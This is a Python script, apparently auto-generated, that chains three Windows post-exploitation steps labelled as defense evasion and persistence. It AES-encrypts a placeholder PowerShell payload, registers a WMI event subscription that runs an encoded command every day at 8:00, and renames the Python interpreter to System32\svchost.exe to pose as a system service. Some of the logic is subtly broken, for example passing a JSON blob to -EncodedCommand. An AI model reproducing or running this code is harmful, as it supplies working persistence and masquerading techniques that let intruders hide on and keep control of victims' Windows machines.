#!/usr/bin/env python3
import sys
import json
import time
import os
import subprocess
import ctypes
from typing import Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import winreg

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Generate a random 16-byte key and IV
        key = os.urandom(16)
        iv = os.urandom(16)
        
        # Example PowerShell payload to be obfuscated
        payload = "Write-Host 'Hello, World!'"
        
        # Pad the payload to a 16-byte boundary
        padded_payload = pad(payload.encode(), AES.block_size)
        
        # Encrypt the padded payload using AES CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(padded_payload)
        
        # Create the obfuscated script with key and iv as hex strings
        obfuscated_script = {
            'ciphertext': ciphertext.hex(),
            'key': key.hex(),
            'iv': iv.hex()
        }
        
        # Convert the obfuscated script to a JSON string
        script = json.dumps(obfuscated_script)
        
        result = {'script': script}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'script': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract the obfuscated PowerShell script from input_data
        script = input_data.get('script', '')

        # Define the WMI Event Subscription command
        subscription_name = "StartupScript"
        command = f"powershell.exe -EncodedCommand {script}"

        # Create the WMI Event Subscription using PowerShell
        wmi_command = (
            f"Register-WmiEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
            f"TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 8 AND TargetInstance.Minute = 0\" "
            f"-Action {{ {command} }} -Name {subscription_name}"
        )

        # Execute the PowerShell command
        subprocess.run(["powershell.exe", "-Command", wmi_command], capture_output=True, timeout=30)

        # Return the subscription ID (name used for the subscription)
        result = {'subscription_id': subscription_name}

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'subscription_id': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Define the target service name to masquerade as
        legitimate_service_name = "svchost.exe"
        
        # Get the current executable path
        current_exe = sys.executable
        
        # Determine the target path in system32 directory
        system32_path = os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', legitimate_service_name)
        
        # Attempt to copy the current executable to the system32 directory with the legitimate service name
        try:
            # Use ctypes to set the process name if needed
            ctypes.windll.kernel32.SetConsoleTitleW(legitimate_service_name)
            os.rename(current_exe, system32_path)
            renamed = True
        except Exception:
            renamed = False
        
        # Prepare the result
        result = {
            "service_name": legitimate_service_name if renamed else None
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'data': {'service_name': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Obfuscate PowerShell Payload [defense-evasion] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Obfuscate PowerShell Payload): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Obfuscate PowerShell Payload): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create WMI Event Subscription [persistence] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create WMI Event Subscription): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create WMI Event Subscription): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Masquerade as Legitimate Service [defense-evasion] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Masquerade as Legitimate Service): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Masquerade as Legitimate Service): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))